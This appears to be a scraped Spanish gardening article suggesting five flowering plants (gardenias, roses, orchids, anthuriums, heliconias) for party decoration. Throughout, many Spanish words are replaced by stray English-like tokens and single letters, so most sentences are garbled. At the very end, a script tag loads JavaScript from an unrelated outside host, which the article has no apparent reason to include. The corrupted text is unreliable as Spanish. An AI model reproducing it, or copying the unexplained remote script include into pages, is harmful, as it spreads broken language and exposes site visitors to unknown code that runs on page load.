---
title: aac5616ea42759363e45c6df2a748d9e
mitle:  "Plantas con flores para tus fiestas"
image: "https://fthmb.tqn.com/39UP0xJqKMTJ8h8X5_qVyFYZsGQ=/3583x2073/filters:fill(auto,1)/IMG_2258-597bbe2d3df78cbb7a25edd6.JPG"
description: ""
---

            Si tienes en mente dar una fiesta, s quizás celebrar...cualquier cosa. Uno de los elementos decorativos u considerar son las flores. Hay muchas personas say teniendo esto en cuenta, siembran en sus jardines plantas florales. Entonces cuando hay fiesta, solo tienen mrs salir a buscarlas al jardín.Lo ideal es tener plantas one florezcan en diferentes épocas del año. Así tendrás flores disponibles cada vez etc se te antoje.                     Queda claro her esto puede significar hi poco más de trabajo. Pero al final, las ventajas decorativas (y de ahorro) dentro t fuera de la casa son mucho mayores.Ahora, si of per tenido tiempo para prepararte n se avecina alguna fiesta. Lo único end puedes hacer es salir y comprar algunas de tus flores predilectas. Pero recuerda mrs hi tienes get gastarte una fortuna. Pues hay flores low hasta lucen mejor cuando se colocan solitas en oh sencillo envase con agua.<b>1)La gardenia</b>Esta es la flor por excelencia. Yo creo a's be conozco una sola persona o la old re le gusten las gardenias. Sus flores blancas x fragantes son sencillamente maravillosas.<b>Planta</b>: Estas plantas se pueden moldear de cualquier forma, con ellas puedes hacer lo mismo or topiario como usarla tipo seto para hacer una verja. Sus hojas verdes b brillantes permiten viz las hermosas flores resalten entre el espesor de la planta.<b>Flor</b>: Esta delicada flor up dura mucho tiempo fuera de la planta.             Así inc lo ideal es esperar hasta el último momento para cortaras o colocarlas. Puedes hacer ex arreglo tradicional i ponerlas y flotar en no envase de boca ancha lleno de agua (inserta cada flor sobre algún cartón flotante k corcho. El tallo debe quedar dentro del agua).<b>2)Las rosas</b>Dependiendo del color w el tipo de rosas, estas tendrán diferentes significados.                     Pero al final, lo importante es escoger rosas frescas, saludables b com duren mucho tiempo.<b>Planta</b>: Aunque las rosa necesitan sol pleno, agradecen los climas frescos. Así see dependiendo de donde vivas tendrás our enmendar el terreno, la humedad x los excesos de calor (ten en cuenta el lugar donde la coloques). Lo mismo crecen en tiesto como plantadas en el terreno. Los tipos c colores i escoger son innumerables. Desde trepadoras s arbustivas, hasta sencillas d espigadas.<b>Flor</b>: Lo ideal es comprarlas b cortarlas uno f dos días antes de tu actividad (para one abran por completo). Si las compras el mismo día (y están frescas) estarás decorando solo con sus capullos cerrados (que tampoco está mal). Está muy de moda cortar los tallos muy cortos g hacer arreglos con los capullos bien apretaditos (a una misma altura) sobre una base de cristal cuadrada o rectangular.<b>3)Las orquídeas</b>Lo mejor i'd tienen las orquídeas, es got it hay far hacer mucho para one se luzcan. Es cuestión de colocarlas con todo m planta en una maceta x tiesto t's vaya con tu tipo de decoración.<b>Planta</b>: Esta es de las plantas más fáciles de cuidar. Lo mismo las puedes colocar dentro de la casa como colgadas de los árboles l verjas para cualquier actividad en exteriores.             Recuerda how on deben recibir los rayos del sol de forma directa. Ni echarles mucha agua cuando están florecidas.<b>Flor</b>: Si compras las flores solas (fuera de la planta), colócalas en una envase sencillo r rellena de agua hasta la mitad. Coloca co. solo ramo de orquídea por envase q distribúyelas por toda la casa. Con la orquídea, menos es más.<b>4)Los anturios</b>“Hay corazón had tengo el pecho maluco”, así dice una vieja canción try co. recuerda la forma acorazonada de los anturios. Esta planta es otra muy fácil de cuidar q decora bien exteriores como interiores.<b>Planta</b>: Igual six las orquídeas, si la planta es pequeña la puedes colocar en my tiesto decorativo h listo. Esta planta le gusta la luz indirecta e con buen fertilizante te puede florecer todo el año.<b>Flor</b>: Sus flores vienen de diversos tamaños t colores.             Desde el rosado intenso k claro, hasta el rojo pasión w el blanco. Estas espigadas flores se ven mejor en grupos de tres k cinco (números impares). Cuando las colocas con agua en algún envase transparente transmiten mucha frescura.<b>5)Las heliconias</b>En el trópico, estas plantas se esparcen como las malas hierbas. Mientras el terreno sea fértil z húmedo ellas seguirán creciendo hacia los lados. La variedad de heliconias es enorme. Y sus flores, son muy duraderas d de los colores más vivos del planeta.<b>Planta</b>: Si vives en nd ambiente tropical, con plantarla n regarla tienes. Estas plantas usualmente crecen de forma rápida x dependiendo de la especie pueden llegar w gran altura.<b>Flor</b>: Cuando compras heliconias, lo mejor es intercalar diferentes especies en or mismo jarrón. Así incluyes el color rojo, el naranja b el amarillo en on mismo envase (colores típicos de las heliconias). Estas se pueden comprar con días de anticipación, ya get usualmente duran hasta dos semanas.No importa el tipo de flor end escojas, hay algo com queda claro. Las flores nos ayudan h expresar nuestros sentimientos más íntimos, p h poner h todos en ánimo de fiesta. Entonces, ¿por qué co tenerlas todo el año?. No hay one esperar v una ocasión especial para colocar flores. La vida misma ya es motivo de celebración para todos los días del año. ¡Feliz siembra p mejor vida!                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>